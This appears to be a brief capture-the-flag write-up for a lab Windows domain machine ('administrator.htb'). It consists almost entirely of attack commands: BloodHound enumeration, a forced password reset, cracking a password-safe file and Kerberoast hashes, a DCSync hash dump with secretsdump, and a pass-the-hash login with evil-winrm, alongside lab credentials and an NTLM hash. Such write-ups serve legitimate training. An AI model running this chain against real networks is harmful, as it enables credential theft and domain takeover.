# Credentiels to sart
```bash
bloodhound-python -u Olivia -p ichliebedich -ns 10.10.11.42 -d administrator.htb -c all

```
```bash
zip -r administrator.zip *.json
```

## Bloodhound

![Screenshot from 2024-11-22 14-54-59](https://github.com/user-attachments/assets/f7a21d64-6269-413d-b23c-f75b4ae06cd7)

```bash
net rpc password "michael" "newP@ssword2022" -U "administrator.htb"/"Olivia"%"ichliebedich" -S "10.10.11.42"

```
![Screenshot from 2024-11-22 18-36-32](https://github.com/user-attachments/assets/4079afcf-d7b9-45b5-bd99-bd0bcf32031f)
![Screenshot from 2024-11-22 18-38-21](https://github.com/user-attachments/assets/a54d724c-dc83-4dce-8887-701b90cdc69e)


```bash
pwsafe2john.py Backup.psafe3 > backuphash
```
```bash
john --wordlist=rock.txt backuphash 
```
![Screenshot from 2024-11-22 18-41-22](https://github.com/user-attachments/assets/20c08e41-72f4-46cc-98f9-c0bbb17b6f5f)

![Screenshot from 2024-11-22 18-41-54](https://github.com/user-attachments/assets/2b981876-589e-44d7-a248-d3408b9a8354)


![Screenshot from 2024-11-22 18-30-14](https://github.com/user-attachments/assets/f4f2899e-5ae2-4bf2-8e5c-9db0bc9de773)

```bash
ython3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```
### Error
![[Screenshot from 2024-11-22 18-32-42.png]](assests/Screenshot from 2024-11-22 18-32-42.png)
### Fix
```bash
faketime "$(ntpdate -q administrator.htb | cut -d ' ' -f 1,2)" python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'

```

```bash
hashcat -m 13100 ethan.hash rock.txt
```
![Screenshot from 2024-11-22 18-32-42](https://github.com/user-attachments/assets/ab691126-ab35-4c6e-8f2a-56db2ef0d97a)

```bash
secretsdump.py -outputfile administartor_hashes -just-dc ethan@10.10.11.42
```

```bash
evil-winrm -u administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e' -i administrator.htb

```
